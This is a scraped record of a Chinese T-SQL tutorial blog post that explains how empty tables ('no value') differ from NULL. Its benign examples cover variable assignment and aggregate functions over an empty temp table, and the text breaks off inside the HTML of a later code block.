{"tags": "NULL,TSQL,无值,IT技术", "front_image_path": "full/d04e5b5dc5af34eab469fb145bba36349f5b9a4f.jpg", "title": "不再迷惑，无值和 NULL 值", "url_object_id": "ef6c307e280a8e27315c464cf98bb302", "url": "http://blog.jobbole.com/111541/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/ljhdo/p/5128417.html\">Vic Liu</a>   </div><p>在关系型数据库的世界中，无值和NULL值的区别是什么？一直被这个问题困扰着，甚至在写TSQL脚本时，心有戚戚焉，害怕因为自己的一知半解，挖了坑，贻害后来人，于是，本着上下求索，不达通幽不罢休的决心（开个玩笑），遂有此文。</p>\n<p>学习过关系型数据库的伙伴都知道，NULL是指不确定的值，在数据库中绝对是噩梦的存在；而空值，一般对字符串类型而言，指没有任何值的字符串类型，为字符类型的变量设置为空值：set @vs=”，空值跟无值不同。有人可能会问，无值是什么？无值，是指数据表中没有任何数据。无值和不确定值，单从字面意思上来看，两者之间的定义很清楚，一旦深究，这两者之间的关系，有时令人十分迷惑（confused），这是因为，在特定条件下，无值会转换为NULL值。</p>\n<h3>一，举个栗子，理解无值和NULL值的区别</h3>\n<p>比如，创建一个临时表，在不插入任何数据时，该数据表是空的，没有任何值，对其执行select命令，将不会返回任何数据值：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bceddaeafa831668078\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncreate table #temp\r\n(\r\nid int null\r\n)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bceddaeafa831668078-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeafa831668078-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bceddaeafa831668078-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeafa831668078-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bceddaeafa831668078-1\"><span class=\"crayon-e\">create </span><span class=\"crayon-v\">table</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#temp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeafa831668078-2\"><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-594bceddaeafa831668078-3\"><span class=\"crayon-e\">id </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeafa831668078-4\"><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>创建一个标量类型的变量，在不初始化时，该变量的值是不确定的，其值是NULL：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bceddaeb04502492568\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndeclare @vs int</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb04502492568-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bceddaeb04502492568-1\"><span class=\"crayon-r\">declare</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">vs </span><span class=\"crayon-t\">int</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>创建一个表类型变量，在不初始化时，该表变量没有任何数据，是无值的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bceddaeb08179295734\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndeclare @vt as table\r\n(\r\nid int null\r\n)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb08179295734-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb08179295734-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb08179295734-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb08179295734-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bceddaeb08179295734-1\"><span class=\"crayon-r\">declare</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">vt </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">table</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb08179295734-2\"><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-594bceddaeb08179295734-3\"><span class=\"crayon-e\">id </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb08179295734-4\"><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>总结一下，声明一个标量型变量，如果没有对变量进行初始化，其值是不确定的，是NULL值；对于表变量，临时表和基础表，如果没有插入任何数据，该表没有任何数据，是无值的。</p>\n<h3>二，无值和NULL值的转换</h3>\n<p>在开始本节之前，先为变量赋值，简单的一个select命令就可以完成变量的赋值：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bceddaeb0b246581194\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect @vs=1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb0b246581194-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bceddaeb0b246581194-1\"><span class=\"crayon-i\">select</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vs</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>有些朋友思维比较活跃，立马会想到：“用select命令可以从表中取值为变量赋值”，对，但是，赋值方法不是我求索的重点，我关注的是从表中取值为变量赋值的结果。</p>\n<p><strong>1，从空表中为变量赋值</strong></p>\n<p>如果数据表是空表，没有任何值，那么数据库引擎不会执行赋值语句，变量保持原有值不变：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bceddaeb0f970637016\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect @vs=id\r\nfrom #temp</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb0f970637016-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb0f970637016-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bceddaeb0f970637016-1\"><span class=\"crayon-i\">select</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vs</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">id</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb0f970637016-2\"><span class=\"crayon-v\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#temp</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>但是，如果采用以下方式，那么数据库引擎会执行赋值语句，由于空表不返回任何值，数据库引擎会把无值转换为不确定值NULL：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bceddaeb12309856991\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect @vs=(select top 1 id\r\nfrom #temp)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb12309856991-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb12309856991-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bceddaeb12309856991-1\"><span class=\"crayon-i\">select</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vs</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">select </span><span class=\"crayon-i\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">id</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb12309856991-2\"><span class=\"crayon-v\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#temp)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>诧异吗？无值和NULL值的转换，居然从不起眼的变量赋值开始。<strong>注意，当不返回任何值时，数据库引擎不确定返回值，就把无值转换为NULL值。</strong></p>\n<p><strong>2，从空表中计算聚合</strong></p>\n<p>空表是没有任何数据的表，计算聚合会产生怎样的结果？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bceddaeb15510247386\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect count(0) as count_all\r\n    ,count(id) as count_id\r\n    ,max(id) as max_id\r\n    ,min(id) as min_id\r\n    ,avg(id) as avg_id\r\n    ,sum(id) as sum_id\r\nfrom #temp</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb15510247386-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb15510247386-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb15510247386-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb15510247386-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb15510247386-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb15510247386-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb15510247386-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bceddaeb15510247386-1\"><span class=\"crayon-e\">select </span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">_</span>all</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb15510247386-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">_</span>id</div><div class=\"crayon-line\" id=\"crayon-594bceddaeb15510247386-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max</span><span class=\"crayon-sy\">_</span>id</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb15510247386-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">min</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min</span><span class=\"crayon-sy\">_</span>id</div><div class=\"crayon-line\" id=\"crayon-594bceddaeb15510247386-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">avg</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">avg</span><span class=\"crayon-sy\">_</span>id</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb15510247386-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sum_id</span></div><div class=\"crayon-line\" id=\"crayon-594bceddaeb15510247386-7\"><span class=\"crayon-v\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#temp</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>当统计数据行数时，返回的是0；当计算聚合函数（max，min，avg和sum）的聚合值时，由于无值可以聚合，数据库引擎不能确定这些聚合函数的返回值，因此，数据库引擎返回NULL值。</p>\n<p><img class=\"aligncenter\" src=\"http://images2015.cnblogs.com/blog/628084/201706/628084-20170620110230601-1550885802.png\" alt=\"\"></p>\n<h3>三，聚合函数忽略NULL值</h3>\n<p>一般情况下，除了count(0)，count(*)之外，聚合函数都会忽略NULL值，而统计非NULL值，如果读者有疑问，可以查看我的博客《<a id=\"cb_post_title_url\" class=\"postTitle2\" href=\"http://www.cnblogs.com/ljhdo/p/4950586.html\">TSQL 聚合函数忽略NULL值</a>》。如果只知聚合函数忽略NULL值，而不知空表也会产生结果为NULL的聚合值，轻易得出聚合函数不会返回NULL值的定论，那就很尴尬。楼主曾遇到过一次“意外”，在一次调试脚本代码的过程中，我遇到max聚合函数返回NULL值的情况，当时一脸懵逼，直接怀疑自己之前的所学。</p>\n<p>当聚合列值都是NULL值时，由于聚合函数忽略NULL值，因此，当计算聚合函数（max，min，avg和sum）的聚合值时，由于无值可以聚合，数据库引擎不能确定这些聚合函数的返回值，因此，数据库引擎返回NULL值。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bceddaeb19071225850\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px 